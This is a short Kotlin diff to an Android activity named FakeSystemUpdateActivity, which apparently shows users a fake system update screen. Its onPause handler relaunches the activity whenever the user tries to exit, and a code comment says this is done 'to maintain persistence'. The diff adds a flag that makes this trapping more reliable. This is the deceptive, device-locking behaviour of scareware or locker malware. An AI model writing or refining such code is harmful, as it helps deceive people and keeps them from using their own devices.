@@ -15,6 +15,7 @@ class FakeSystemUpdateActivity : AppCompatActivity() {
     private lateinit var statusText: TextView
     private val handler = Handler(Looper.getMainLooper())
     private var progress = 0
+    private var isRestarting = false
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -60,7 +61,8 @@ class FakeSystemUpdateActivity : AppCompatActivity() {
     override fun onPause() {
         super.onPause()
         // If user manages to exit, restart this activity to maintain persistence
-        if (!isFinishing) {
+        if (!isFinishing && !isRestarting) {
+            isRestarting = true
             val intent = Intent(this, FakeSystemUpdateActivity::class.java)
             startActivity(intent)
         }
